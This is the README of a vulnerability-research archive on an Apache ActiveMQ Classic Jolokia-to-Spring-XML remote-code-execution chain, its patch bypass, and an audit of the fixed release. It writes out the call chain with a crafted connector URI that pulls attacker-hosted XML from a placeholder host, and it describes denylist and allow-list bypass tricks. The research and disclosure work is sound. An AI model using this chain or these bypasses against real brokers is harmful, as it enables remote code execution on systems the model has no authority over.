# Apache ActiveMQ Classic — RCE Research

Private research archive for the **Apache ActiveMQ Classic** Jolokia → `addNetworkConnector` → xbean/Spring-XML remote-code-execution chain (**CVE-2026-34197** and its patch-bypass **CVE-2026-42588**), plus a full auto-research audit of the fixed **6.2.6** release and a side-by-side comparison with Crowdfense's public bypass writeup.

> Authorized security research. All exploitation was performed against **local lab brokers** (Docker / self-hosted). Payloads use placeholder attacker hosts. Nothing here targets a third-party system.

---

## Contents

| Dir | Phase | What's inside |
|-----|-------|---------------|
| [`00-comparison-vs-crowdfense.md`](00-comparison-vs-crowdfense.md) | Comparison | Our work vs. the Crowdfense "ActiveMQ RCE Bypass" article, source-verified at file:line |
| [`01-original-cve-2026-34197/`](01-original-cve-2026-34197/) | Original repro | Analysis + PoC scripts + Spring-XML payloads (lab: `activemq-classic:5.18.6`) |
| [`02-reaudit-apr30/`](02-reaudit-apr30/) | Version matrix | `uid=0` on 5.18.3 / 5.18.6 / 6.1.4 / 6.1.7; assessment + PoC + `version-matrix.sh` |
| [`03-reaudit-42588-42253/`](03-reaudit-42588-42253/) | Live bypass | No-paren composite bypass (42588) + MessageServlet XSS (42253), reproduced live |
| [`04-audit-6.2.6/`](04-audit-6.2.6/) | Full audit | Auto-research audit of hardened 6.2.6: final report + findings ledger |

Vendor source trees and binary distributions used during the labs are intentionally **excluded** (they're upstream, not ours).

---

## The vulnerability in one line

An authenticated (unauthenticated on 6.0.0–6.1.1 via CVE-2024-32114) Jolokia caller invokes `BrokerView.addNetworkConnector(uri)` with a crafted discovery URI whose inner `vm://…?brokerConfig=xbean:<url>` forces the broker to load an attacker-controlled Spring XML, which eagerly instantiates a `ProcessBuilder` bean **before** broker validation → OS command execution.

```
POST /api/jolokia/  →  BrokerView.addNetworkConnector(String)
  →  static:(vm://evil?brokerConfig=xbean:http://ATTACKER/evil.xml)
  →  VMTransportFactory dynamic broker creation  →  XBeanBrokerFactory
  →  ResourceXmlApplicationContext loads Spring XML  →  ProcessBuilder bean  →  RCE
```

---

## Findings

**Headline:** three findings are **live-proven** to root/XSS; the 6.2.6 audit adds a broader set that is **source-verified and adversarially judged, but not yet live-detonated**. None of the 6.2.6 extras is a new *unauthenticated* RCE — the vendor closed those doors; the residual risk shifted to authorization and output-encoding.

### Proven exploitation chain

| ID | Finding | Class | Severity | Auth | Proof |
|----|---------|-------|----------|------|-------|
| **CVE-2026-34197** | Jolokia `addNetworkConnector` → xbean Spring-XML RCE | RCE | Critical | Post-auth (unauth 6.0.0–6.1.1) | **Live — `uid=0`** on 5.18.3 / 5.18.6 / 6.1.4 / 6.1.7 |
| **CVE-2026-42588** | No-paren composite-URI bypass of the 34197 denylist | RCE (patch bypass) | Critical | Post-auth | **Live — `uid=0`** on 34197-patched 5.19.6 + 6.2.0 |
| **CVE-2026-42253** | `MessageServlet` header injection → stored XSS | Injection / XSS | Medium | Post-auth | **Live** on 6.2.0 |

### Net-new from the 6.2.6 audit (source-verified)

| ID | Finding | Class | Severity | Auth | Notes |
|----|---------|-------|----------|------|-------|
| **C1** | `static:` **denylist gap → SSRF** — `static` absent from `DENIED_TRANSPORT_SCHEMES`; `addNetworkConnector("static:(tcp://…)")` → outbound broker TCP | SSRF | Medium | Admin / JMX | Sink variant **past the same 34197/42588 denylist** the article covers |
| **B1** | Durable-subscription **cross-clientId deletion IDOR** — `removeSubscription` keys on wire-supplied `clientId` and is un-gated in `AuthorizationBroker` | Broken authz / IDOR | Medium | Post-auth (pre-auth if broker auth off) | Cleanest net-new |
| **B3** | LDAP **empty-password → anonymous bind** (`LDAPLoginModule`, no emptiness guard) | Auth bypass | Medium (cond.) | Pre-auth | Conditional on directory accepting anon binds |
| **A1–A7** | Console **output-encoding injection family** — attacker-controlled `MessageId.textView` (OpenWire v10+ & AMQP) unescaped across ~7 JSP/REST sinks + `FileSystemBlobStrategy` path-traversal | Injection | Low–Medium | Producer → admin | CSP-gated to HTML/content-injection by default |
| **B2** | Shiro `WildcardPermission` **colon-injection verb-escalation** | Priv-esc | Low–Med | Post-auth | Shiro non-default |
| **B4** | Temp-destination authz **fail-open** asymmetry vs non-temp fail-closed | Broken authz | Low | Post-auth | By-design (AMQ-4721); hardening note |
| **B5** | `StatisticsBroker` `replyTo` **skips write-ACL** when plugin ordered before authorization | Broken authz | Low | Post-auth | Config-order dependent |
| **B6** | Cert-login **non-canonical DN** (`getSubjectDN().getName()`) → identity collision among same-CA certs | Auth | Low | Pre-auth (TLS-validated) | "Any self-signed cert" does **not** work |
| **B7** | `JMSXUserID` **spoof** when `populateJMSXUserID=false` (the default) | Spoofing | Low | Post-auth | — |
| **F5** | STOMP outbound header-**name** never escaped → frame injection to co-tenant subscriber | Injection | Low | Cross-protocol | STOMP enabled |

### Out of scope — DoS (cataloged, not headline)

MQTT `QoS` ordinal AIOOBE (`QoS.values()[ordinal]`, cross-protocol, no config) · `OpenWireFormat.DEFAULT_MAX_FRAME_SIZE = Long.MAX_VALUE` · signed-`short` `NegativeArraySizeException` in OpenWire unmarshal · negative `AMQ_SCHEDULED_REPEAT` immortal job.

---

## Comparison with the Crowdfense writeup

Crowdfense's [*Apache ActiveMQ RCE Bypass*](https://www.crowdfense.com/apache-activemq-rce-bypass/) covers the **same chain** (they file it under CVE-2026-34197; we track the bypass as its own CVE-2026-42588). Both accounts converge on a three-layer defense; the only divergence is **Layer 2**.

| Layer | Defense | Crowdfense defeats it by | We defeated it by |
|-------|---------|--------------------------|-------------------|
| 1 | Scheme **denylist** (34197 fix) | No-paren composite `static:vm://…` | **Same — independently found** ✅ |
| 2 | xbean `{file,classpath}` **allow-list** (#1910) | Percent-encoded `file:%2f%2f…` → Windows **UNC → WebDAV** → remote HTTP fetch | **Local file** `xbean:/tmp/evil.xml` (needs local write) |
| 3 | `VMTransportFactory` **scheme gate** (`broker,properties`, the 42588 / 6.2.6 fix) | Acknowledged as the kill | **Same conclusion** ✅ |

**The one gap:** their Layer-2 percent-encoding + UNC/WebDAV trick achieves *fully-remote* delivery with no local-write primitive. The classifier flaw it abuses (`activemq-spring/Utils.java:123-129`, a raw `startsWith("file://")` on the undecoded string) **is present in our exact source** — but the remote half is **Windows-only** (Linux treats `//host/share` as a local path), and our lab was Linux, so it wasn't exercisable there. It is **dead on 6.2.6 anyway** (the `VMTransportFactory` scheme gate rejects `xbean` before `Utils` runs).

**Follow-up:** a **Windows-hosted** 5.19.6 (or any pre-5.19.7/6.2.6 build) + SMB/WebDAV listener would let us demonstrate the fully-remote allow-list bypass — the single capability the article has that our engagement hasn't shown.

---

## Fix (ActiveMQ 6.2.6)

Three commits close the chain: `c1b44af11` (validate composite URIs without parens — `parseComposite` unconditionally + recurse), `c2fc7a1d6` (block `XBeanBrokerFactory` by default via the `VMTransportFactory` scheme allow-list), and `be8415f24` (sample-config hardening: Jolokia to loopback, operation deny-list with `addNetworkConnector`).
